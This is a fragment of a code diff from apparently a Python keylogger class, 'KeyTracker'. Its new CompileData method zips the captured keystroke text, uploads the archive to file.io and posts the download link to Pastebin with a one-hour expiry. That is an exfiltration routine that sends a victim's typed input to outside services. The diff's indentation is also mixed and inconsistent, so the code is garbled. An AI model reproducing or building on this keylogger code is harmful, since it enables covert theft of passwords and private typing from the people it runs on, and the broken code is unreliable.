@@ -331,9 +331,12 @@ class KeyTracker:
 
         ###--NOT IMPLEMENTED IN BASE LOGGER---###
         """
-        with ZipFile("data.zip", "w") as zip:
-	    zip.write(outfile)
-	    outfile.close()
+        def CompileData(self):
+            # Create zipped file contents
+            contents = "\n%s\n%s" % ('-'*15, self.tracked_string_concat)
+
+            with ZipFile("data.zip", "w") as zip:
+	        zip.writestr('data.txt', contents)
 
             url = upload('fileio', 'data.zip')
 	    result = pbin.CreatePaste(url,"link.txt","cil", 1, "1H")
